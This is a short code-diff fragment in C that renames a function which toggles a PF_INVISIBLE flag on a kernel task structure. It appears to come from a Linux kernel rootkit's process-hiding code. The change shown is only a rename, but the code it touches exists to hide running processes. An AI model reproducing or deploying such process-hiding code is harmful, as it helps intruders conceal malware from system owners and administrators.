@@ -32,7 +32,7 @@ is_invisible_task_struct(struct task_struct *task) {
 }
 
 void
-toggle_invisability(struct task_struct *task) {
+toggle_proc_invisability(struct task_struct *task) {
     if (task)
         task->flags ^= PF_INVISIBLE;
 }
